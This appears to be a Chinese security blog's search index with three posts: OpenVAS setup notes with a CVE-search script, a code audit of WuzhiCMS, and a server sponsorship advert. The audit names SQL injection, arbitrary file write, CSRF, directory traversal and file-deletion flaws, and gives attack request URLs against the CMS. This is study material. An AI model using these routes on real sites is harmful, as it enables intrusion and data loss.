<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>openvas</title>
      <link href="/2025/01/20/2025%E5%B9%B41%E6%9C%8820%E6%97%A5-nasl%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>/2025/01/20/2025%E5%B9%B41%E6%9C%8820%E6%97%A5-nasl%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="openvas调研"><a href="#openvas调研" class="headerlink" title="openvas调研"></a>openvas调研</h2><p>openvas是nessus项目分支，基于B/S框架进行工作，执行扫描并提供扫描结果</p><p>安装的话kali或者ubuntu都可以，</p><p>如果我没记错应该是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gvm</span><br></pre></td></tr></table></figure></p><p>检查是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gvm-check-setup</span><br></pre></td></tr></table></figure></p><p>启动是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gvm-start</span><br></pre></td></tr></table></figure><br>如果出现了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[&gt;] Please wait for the GVM services to start.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;] You might need to refresh your browser once it opens.</span><br><span class="line">[&gt;]</span><br><span class="line">[&gt;]  Web UI (Greenbone Security Assistant): https://127.0.0.1:9392</span><br><span class="line"></span><br><span class="line">● gsad.service - Greenbone Security Assistant daemon (gsad)</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/gsad.service; disabled; preset: disabled)</span><br><span class="line">     Active: active (running) since Mon 2025-03-31 13:42:28 CST; 65ms ago</span><br><span class="line"> Invocation: ecffdcc6ce684dfb907bdb1c0014c502</span><br><span class="line">       Docs: man:gsad(8)</span><br><span class="line">             https://www.greenbone.net</span><br><span class="line">   Main PID: 235214 (gsad)</span><br><span class="line">      Tasks: 1 (limit: 4511)</span><br><span class="line">     Memory: 2M (peak: 2M)</span><br><span class="line">        CPU: 22ms</span><br><span class="line">     CGroup: /system.slice/gsad.service</span><br><span class="line">             ├─235214 /usr/sbin/gsad --foreground --listen 0.0.0.0 --port 9392</span><br><span class="line">             └─235216 /usr/sbin/gsad --foreground --listen 0.0.0.0 --port 9392</span><br><span class="line"></span><br><span class="line">3月 31 13:42:28 kawakaze systemd[1]: Starting gsad.service - Greenbone Security Assistant daemon (gsad)...</span><br><span class="line">3月 31 13:42:28 kawakaze systemd[1]: Started gsad.service - Greenbone Security Assistant daemon (gsad).</span><br><span class="line"></span><br><span class="line">● gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/gvmd.service; disabled; preset: disabled)</span><br><span class="line">     Active: active (running) since Mon 2025-03-31 13:42:23 CST; 5s ago</span><br><span class="line"> Invocation: a7b7ce4ca6fd433e8abc52934746f188</span><br><span class="line">       Docs: man:gvmd(8)</span><br><span class="line">    Process: 234620 ExecStart=/usr/sbin/gvmd --osp-vt-update=/run/ospd/ospd.sock --listen-group=_gvm (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 234621 (gvmd)</span><br><span class="line">      Tasks: 1 (limit: 4511)</span><br><span class="line">     Memory: 211.3M (peak: 339.9M)</span><br><span class="line">        CPU: 4.707s</span><br><span class="line">     CGroup: /system.slice/gvmd.service</span><br><span class="line">             └─234621 &quot;gvmd: Waiting &quot; --osp-vt-update=/run/ospd/ospd.sock --listen-group=_gvm</span><br><span class="line"></span><br><span class="line">3月 31 13:42:15 kawakaze systemd[1]: Starting gvmd.service - Greenbone Vulnerability Manager daemon (gvmd)...</span><br><span class="line">3月 31 13:42:15 kawakaze systemd[1]: gvmd.service: Can&#x27;t open PID file /run/gvmd/gvmd.pid (yet?) after start: No such file or directory</span><br><span class="line">3月 31 13:42:23 kawakaze systemd[1]: Started gvmd.service - Greenbone Vulnerability Manager daemon (gvmd).</span><br><span class="line"></span><br><span class="line">● ospd-openvas.service - OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/ospd-openvas.service; disabled; preset: disabled)</span><br><span class="line">     Active: active (running) since Mon 2025-03-31 13:42:15 CST; 12s ago</span><br><span class="line"> Invocation: 3052909356974660937e6cc23f5107e1</span><br><span class="line">       Docs: man:ospd-openvas(8)</span><br><span class="line">             man:openvas(8)</span><br><span class="line">    Process: 234594 ExecStart=/usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf (code=exited, status=0/SUCCESS)</span><br><span class="line">   Main PID: 234600 (ospd-openvas)</span><br><span class="line">      Tasks: 5 (limit: 4511)</span><br><span class="line">     Memory: 132.4M (peak: 161.1M)</span><br><span class="line">        CPU: 2.753s</span><br><span class="line">     CGroup: /system.slice/ospd-openvas.service</span><br><span class="line">             ├─234600 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf</span><br><span class="line">             └─234602 /usr/bin/python3 /usr/bin/ospd-openvas --config /etc/gvm/ospd-openvas.conf --log-config /etc/gvm/ospd-logging.conf</span><br><span class="line"></span><br><span class="line">3月 31 13:42:14 kawakaze systemd[1]: Starting ospd-openvas.service - OSPd Wrapper for the OpenVAS Scanner (ospd-openvas)...</span><br><span class="line">3月 31 13:42:15 kawakaze systemd[1]: Started ospd-openvas.service - OSPd Wrapper for the OpenVAS Scanner (ospd-openvas).</span><br><span class="line"></span><br><span class="line">[&gt;] Opening Web UI (https://127.0.0.1:9392) in: 5... 4... 3... 2... 1...</span><br></pre></td></tr></table></figure><p>说明启动成功了，（因为我第一次安装的时候不知道为什么安装成功了,check检查没问题，但是就是启动不起来）</p><p>接下来就是打开本地的9392端口</p><p>更新openvas插件是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo greenbone-nvt-sync</span><br></pre></td></tr></table></figure></p><p><code>/var/lib/openvas/plugins</code></p><p>openvas所有的脚本都在里面，<br>如果想要找到某一个脚本，可以试一下我这个代码<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">def search_in_file(file_path, search_string):</span><br><span class="line">    try:</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:</span><br><span class="line">            for line in file:</span><br><span class="line">                if search_string in line:</span><br><span class="line">                    return True</span><br><span class="line">    except (UnicodeDecodeError, IOError):</span><br><span class="line">        pass</span><br><span class="line">    return False</span><br><span class="line">def search_in_directory(directory, search_string, output_file):</span><br><span class="line">    with open(output_file, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as outfile:</span><br><span class="line">        for root, _, files in os.walk(directory):</span><br><span class="line">            for file in files:</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                if search_in_file(file_path, search_string):</span><br><span class="line">                    outfile.write(f&quot;&#123;file_path&#125;\n&quot;)</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    current_directory = os.getcwd()</span><br><span class="line">    search_string = input(&quot;CVE编号:&quot;)</span><br><span class="line">    output_file = search_string + &quot;_search_result.txt&quot;</span><br><span class="line">    search_in_directory(current_directory, search_string, output_file)</span><br><span class="line">    print(f&quot;Search results saved to: &#123;output_file&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>编写openvas脚本的时候，有个问题，就是当我编写sql延时注入的时候，回显是…..，而且等很久没有其他输出，就很奇怪</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> openvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五指cms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8829%E6%97%A5-%E4%BA%94%E6%8C%87cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8829%E6%97%A5-%E4%BA%94%E6%8C%87cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>在根目录index.php中看到</p><p><img src="https://pic.imgdb.cn/item/66f8e54ef21886ccc044b327.png" alt=""></p><p>其中的<code>./configs/web_config.php</code>是配置文件，<code>core.php</code>是核心框架文件</p><p><code>load_class(&quot;application&quot;)</code>将application这个类实例化了</p><p>然后调用$app对象的run方法运行</p><p>因为是调用<code>load_class</code>加载application类，所以就是<code>application.class.php</code></p><p>通过<code>load_class</code>来到core.php里面</p><p><img src="https://pic.imgdb.cn/item/66f8e82df21886ccc047af1b.png" alt=""></p><p>里面有个<code>COREFRAME_ROOT</code>,<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#x27;WWW_ROOT&#x27;) or exit(&#x27;No direct script access allowed&#x27;);</span><br><span class="line"></span><br><span class="line">define(&#x27;COREFRAME_ROOT&#x27;,substr(dirname(__FILE__),0,-11).&#x27;coreframe&#x27;.DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#x27;CACHE_ROOT&#x27;,substr(dirname(__FILE__),0,-11).&#x27;caches&#x27;.DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#x27;CACHE_EXT&#x27;,&#x27;f1q_e&#x27;);</span><br></pre></td></tr></table></figure></p><p>获取文件地址并减去最后11个字符</p><p><code>COREFRAME_ROOT.&#39;app/&#39;.$m.&#39;/libs/class/&#39;.$class.&#39;.class.php&#39;</code></p><p>这个实际上就是路径名<code>app目录下模块名/libs/class/类名.class.php</code></p><p>实例化wuzhi_application类的时候会调用下面的构造函数将路由信息定义完成</p><p><img src="https://pic.imgdb.cn/item/66f8f513f21886ccc058d92a.png" alt=""></p><p>这个是当类的实例被创建时，这个方法会自动调用</p><p>也就是说这个是</p><p>加载application类的时候，调用load_class获取application.class.php并实例化，<br>然后通过run获取路由信息</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>在这里存在sql漏洞</p><p><img src="https://pic.imgdb.cn/item/66f90a4ff21886ccc07b2b36.png" alt=""></p><p>bp抓包</p><p><img src="https://pic.imgdb.cn/item/66f90a1ff21886ccc07ad919.png" alt=""></p><p>可以定位到<br><code>/coreframe/app/member/admin/group.php</code>的del()函数</p><p><img src="https://pic.imgdb.cn/item/66f90f88f21886ccc082612a.png" alt=""></p><p>这里的第133行是判断groupid是否为空，134行是判断是否是数组，但是这里不管是不是他都执行了delete函数操作数据库</p><p>追踪delete函数，（我也不知道他这个追踪是怎么追踪的，我直接control f搜索delete里面好多，但是又没看到php代码审计的插件)</p><p>在<code>db.class.php</code>里面看到</p><p><img src="https://pic.imgdb.cn/item/66fe4824a0d098f8981d74e6.png" alt=""></p><p>其中调用了array2sql,其中的array2sql是</p><p><img src="https://pic.imgdb.cn/item/66fe49c3a0d098f8981f2334.png" alt=""></p><p>可以得出是将数组转换成sql语言并移除一些特殊符号防止sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if(is_array($data)) &#123;</span><br><span class="line">    $sql = &#x27;&#x27;;</span><br><span class="line">    foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">        $val = str_replace(&quot;%20&quot;, &#x27;&#x27;, $val);</span><br><span class="line">        $val = str_replace(&quot;%27&quot;, &#x27;&#x27;, $val);</span><br><span class="line">        $val = str_replace(&quot;(&quot;, &#x27;&#x27;, $val);</span><br><span class="line">        $val = str_replace(&quot;)&quot;, &#x27;&#x27;, $val);</span><br><span class="line">        $val = str_replace(&quot;&#x27;&quot;, &#x27;&#x27;, $val);</span><br><span class="line">        $sql .= $sql ? &quot; AND `$key` = &#x27;$val&#x27; &quot; : &quot; `$key` = &#x27;$val&#x27; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $sql;</span><br><span class="line">&#125;</span><br><span class="line">- 如果 $data 是一个数组，则初始化一个空字符串 $sql。</span><br><span class="line">- 遍历数组，将每个键值对转换为 SQL 格式的条件。</span><br><span class="line">- 使用 str_replace 函数移除一些特殊字符（如 %20, %27, (, ), &#x27;），以防止 SQL 注入。</span><br><span class="line">- 将每个条件拼接成一个 SQL WHERE 子句，多个条件之间用 AND 连接。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只有最下面的那行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;master_db-&gt;delete($table, $where);</span><br></pre></td></tr></table></figure><br>是对数据库进行操作的</p><p><code>$this-&gt;master</code>是对数据库进行连接的</p><p>在目录内查找delete，在<code>mysqli.class.php</code>中发现是<code>WUZHI_mysqli</code>类下的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public function __construct($config_file = &#x27;mysql_config&#x27;)</span><br><span class="line">获取www/configs/mysql_config.php中mysql的配置信息</span><br><span class="line">&#123;</span><br><span class="line">$this-&gt;mysql_config = get_config($config_file);</span><br><span class="line">$this-&gt;dbname = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;dbname&#x27;];</span><br><span class="line">$this-&gt;tablepre = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;tablepre&#x27;];</span><br><span class="line">$this-&gt;dbcharset = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;dbcharset&#x27;];</span><br><span class="line"></span><br><span class="line">$this-&gt;slave_server = isset($this-&gt;mysql_config[$this-&gt;db_key][&#x27;slave_server&#x27;]) ? $this-&gt;mysql_config[$this-&gt;db_key][&#x27;slave_server&#x27;] : &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">$class = $this-&gt;mysql_config[$this-&gt;db_key][&#x27;type&#x27;];</span><br><span class="line">require_once(COREFRAME_ROOT.&#x27;app/core/libs/class/&#x27;.$class.&#x27;.class.php&#x27;);</span><br><span class="line">$classname = &#x27;WUZHI_&#x27;.$class;</span><br><span class="line">$this-&gt;master_db = new $classname($this-&gt;mysql_config[$this-&gt;db_key]);</span><br><span class="line">if($this-&gt;slave_server) &#123;</span><br><span class="line">$slave_server = weight_rand($this-&gt;slave_server);</span><br><span class="line">if($slave_server==&#x27;default&#x27;) &#123;</span><br><span class="line">$this-&gt;read_db = $this-&gt;master_db;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$this-&gt;read_db = new $classname($this-&gt;mysql_config[$this-&gt;slave_server]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$this-&gt;read_db = $this-&gt;master_db;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66fe78a5335a200d6a9b443b.png" alt=""></p><p>在mysqli.class.php中，他没有做任何过滤直接将语句拼接到<code>$sql</code>并通过query（）执行，所以存在sql漏洞</p><p><img src="https://pic.imgdb.cn/item/66fe7904335a200d6a9b891f.png" alt=""></p><p>这里可以进行报错注入</p><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p><img src="https://pic.imgdb.cn/item/66ff6d72d29ded1a8c8b4be0.png" alt=""></p><p>通过seay审计发现里面有个file_put_content函数可能存在任意文件写入，进去查看发现这里是通过data内容可以控制写入文件的内容</p><p><img src="https://pic.imgdb.cn/item/66ff6dd7d29ded1a8c8b9b1e.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/66ff6e59d29ded1a8c8c0523.png" alt=""></p><p>这phpstorm中找到他的funvtion<code>set_cache</code></p><p>他只判断是了是否提交了表单但没对提交的内容进行过滤，这就导致<code>setting</code>参数也就是上面所说的 <code>$data</code> 部分写入造成任意文件写入</p><p><img src="https://pic.imgdb.cn/item/67076359d29ded1a8c69640b.png" alt=""></p><p>如果没有提交表单，就会通过<code>get_cache</code>读取缓存文件</p><p><img src="https://pic.imgdb.cn/item/67076392d29ded1a8c699bd2.png" alt=""></p><p>所以我们可以这么构造文件读写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?</span><br><span class="line">m=attachment&amp;f=index&amp;v=ueditor&amp;_su=wuzhicms&amp;submit=XXX&amp;setting=payload</span><br></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在这里</p><p><img src="https://pic.imgdb.cn/item/66ff820fd29ded1a8c9c0012.png" alt=""></p><p>当我们提交的时候发现</p><p><img src="https://pic.imgdb.cn/item/66ff822dd29ded1a8c9c18e4.png" alt=""></p><p>提示了账号不存在，说明必须要一个前台账号才能设置为系统管理员账号，</p><p><img src="https://pic.imgdb.cn/item/66ff84ffd29ded1a8c9ee282.png" alt=""></p><p>抓包发现添加管理员的路由，找到源码<code>/coreframe/app/core/admin/power.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">这段代码是一个名为 add 的方法，用于添加管理员。以下是详细分析：</span><br><span class="line">检查是否提交表单：</span><br><span class="line">if(isset($GLOBALS[&#x27;submit&#x27;])) &#123;</span><br><span class="line">检查全局变量 $GLOBALS[&#x27;submit&#x27;] 是否存在，以确定是否提交了表单。</span><br><span class="line">验证用户名：</span><br><span class="line">if(empty($GLOBALS[&#x27;form&#x27;][&#x27;username&#x27;])) MSG(L(&#x27;parameter error&#x27;));</span><br><span class="line">$username = $GLOBALS[&#x27;form&#x27;][&#x27;username&#x27;];</span><br><span class="line">$r = $this-&gt;db-&gt;get_one(&#x27;member&#x27;, array(&#x27;username&#x27; =&gt; $username));</span><br><span class="line">if(!$r[&#x27;uid&#x27;]) MSG(L(&#x27;账号不存在，请先管理会员处－添加账号&#x27;));</span><br><span class="line">检查表单中的 username 是否为空，如果为空则显示错误消息。</span><br><span class="line">获取表单中的 username 并从 member 表中查找对应的记录。</span><br><span class="line">如果找不到对应的用户 ID (uid)，则显示错误消息。</span><br><span class="line">检查管理员是否已存在：</span><br><span class="line">$rs = $this-&gt;db-&gt;get_one(&#x27;admin&#x27;, array(&#x27;uid&#x27; =&gt; $r[&#x27;uid&#x27;]));</span><br><span class="line">if($rs) MSG(L(&#x27;管理员已存在！&#x27;));</span><br><span class="line">从 admin 表中查找对应的用户 ID (uid)。</span><br><span class="line">如果找到记录，则显示管理员已存在的消息。</span><br><span class="line">准备表单数据：</span><br><span class="line">$formdata = array();</span><br><span class="line">$formdata[&#x27;uid&#x27;] = $r[&#x27;uid&#x27;];</span><br><span class="line">if(empty($GLOBALS[&#x27;form&#x27;][&#x27;password&#x27;])) &#123;</span><br><span class="line">    $formdata[&#x27;password&#x27;] = &#x27;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $factor = substr(random_string(&#x27;md5&#x27;), 0, 6);</span><br><span class="line">    $password = md5(md5($GLOBALS[&#x27;form&#x27;][&#x27;password&#x27;]) . $factor);</span><br><span class="line">    $formdata[&#x27;password&#x27;] = $password;</span><br><span class="line">    $formdata[&#x27;factor&#x27;] = $factor;</span><br><span class="line">&#125;</span><br><span class="line">$formdata[&#x27;role&#x27;] = &#x27;,&#x27; . implode(&#x27;,&#x27;, $GLOBALS[&#x27;form&#x27;][&#x27;role&#x27;]) . &#x27;,&#x27;;</span><br><span class="line">$formdata[&#x27;truename&#x27;] = remove_xss($GLOBALS[&#x27;form&#x27;][&#x27;truename&#x27;]);</span><br><span class="line">初始化一个空数组 $formdata。</span><br><span class="line">将用户 ID (uid) 添加到 $formdata。</span><br><span class="line">检查表单中的 password 是否为空，如果为空则设置为空字符串。</span><br><span class="line">如果不为空，则生成一个随机因子 (factor)，并使用 MD5 加密密码和因子。</span><br><span class="line">将加密后的密码和因子添加到 $formdata。</span><br><span class="line">将角色信息和真实姓名添加到 $formdata。</span><br><span class="line">插入数据并显示成功消息：</span><br><span class="line">$this-&gt;db-&gt;insert(&#x27;admin&#x27;, $formdata);</span><br><span class="line">MSG(L(&#x27;operation success&#x27;));</span><br><span class="line">将 $formdata 插入到 admin 表中。</span><br><span class="line">显示操作成功的消息。</span><br><span class="line">显示添加管理员表单：</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $show_formjs = 1;</span><br><span class="line">    $form = load_class(&#x27;form&#x27;);</span><br><span class="line">    $roles = $this-&gt;db-&gt;get_list(&#x27;admin_role&#x27;, &#x27;&#x27;, &#x27;*&#x27;, 0, 100);</span><br><span class="line">    include $this-&gt;template(&#x27;power_add&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">如果没有提交表单，则显示添加管理员的表单。</span><br><span class="line">设置 show_formjs 为 1。</span><br><span class="line">加载表单类并获取角色列表。</span><br><span class="line">包含并显示 power_add 模板。</span><br></pre></td></tr></table></figure><p>在代码38行处根据用户名<br>从数据库中取出前台账户，如果该前台用户不存在则会提示如下内容，也就是我们上面的提示，在40行代码判断该用户是否已经是管理员，而44-51行代码是判断添加管理员时是否设置密码，这部分操作在上面部分我们添加管理员的时候也可以看得出来，在代码54行将我们的内容插入到数据库中</p><p><img src="https://pic.imgdb.cn/item/66ff9600d29ded1a8caede21.png" alt=""></p><p>能看出来这部分没有进行token校验或者其他手段，这就导致我们可以伪造数据包进行csrf</p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>glob函数发现存在目录遍历，这里面的<code>glob()</code>的$<code>dir</code>参数可控,上面的18行做了一些过滤</p><p><img src="https://pic.imgdb.cn/item/66ff97d7d29ded1a8cb0a8db.png" alt=""></p><p>29行通过<code>include $this -&gt;template(&#39;listing&#39;)</code>包含并渲染旗下的<code>listing.tpl.php</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">glob()函数返回一个包含匹配指定模式的文件名或目录的数组</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">glob(pattern,flags)</span><br><span class="line">    pattern</span><br><span class="line">    必需。规定检索模式。</span><br><span class="line">    flags</span><br><span class="line">    可选。规定特殊的设定。</span><br><span class="line">返回值：</span><br><span class="line">该函数返回一个包含有匹配文件/目录的数组。如果失败则返回 FALSE。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m=template&amp;f=index&amp;v=listing&amp;_su=wuzhicms</span><br></pre></td></tr></table></figure><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p>全局查找危险函数unlink（删除指定文件）</p><p>发现my_unlink里面调用了这个函数</p><p><img src="https://pic.imgdb.cn/item/66ff9ac3d29ded1a8cb349bb.png" alt=""></p><p>跟踪一下</p><p>其中一个位于del()函数内部，</p><p><img src="https://pic.imgdb.cn/item/66ff9b1fd29ded1a8cb39675.png" alt=""></p><p>这两个地方需要传入id和url，但是通过<code>remove_xss</code>函数过滤了</p><p><img src="https://pic.imgdb.cn/item/66ff9b73d29ded1a8cb3dcf6.png" alt=""></p><p>这里是对我们输入的东西进行实体编码，替换了一些文字防止<code>&lt;IMG SRC=@avascript:alert(&#39;XSS&#39;)&gt; 的攻击</code>，下面过滤了一些js的标签</p><p>回到del（）函数，他里面是鲜活的一个id，然后从数据库查找这个id对应的path，但是如果没有id的话会直接根据你输入的path进行文件操作，所以我们只需要构造path就可以了</p><p><img src="https://pic.imgdb.cn/item/6707b1fbd29ded1a8cbd49d9.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/6707b154d29ded1a8cbcb023.png" alt=""></p><p>所以可以</p><p><img src="https://pic.imgdb.cn/item/6707651cd29ded1a8c6b20ec.png" alt=""></p><p>至此,五指cms的审计结束</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DK盾</title>
      <link href="/2025/01/08/2024%E5%B9%B49%E6%9C%8827%E6%97%A5-DKDUN/"/>
      <url>/2025/01/08/2024%E5%B9%B49%E6%9C%8827%E6%97%A5-DKDUN/</url>
      
        <content type="html"><![CDATA[<p>DK盾</p><p>DK盾-CTFers赞助计划</p><p>CTFers可获得DK盾赞助服务器2C2G-32H64g不定</p><p>（1元/月续费）</p><p>参与条件 1.参与过国内CTF赛事5个以上</p><p>2.个人技术博客每月更新1篇（CTF技术相关）以上</p><p>3.博客底部挂DK盾赞助或有一篇推广文章</p><p>续费条件 1.满足参与条件2，3</p><p>2.积极参与CTF赛事</p><p>3.1元/月续费</p><p>CTF团队可获得更多 高防CDN，高防机柜免费托管等福利 有意向请提交工单并附上相关截图和网站</p><p>详细可以加群727077055</p>]]></content>
      
      
      <categories>
          
          <category> DK盾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 广告赞助 </tag>
            
        </tags>
      
    </entry>
    
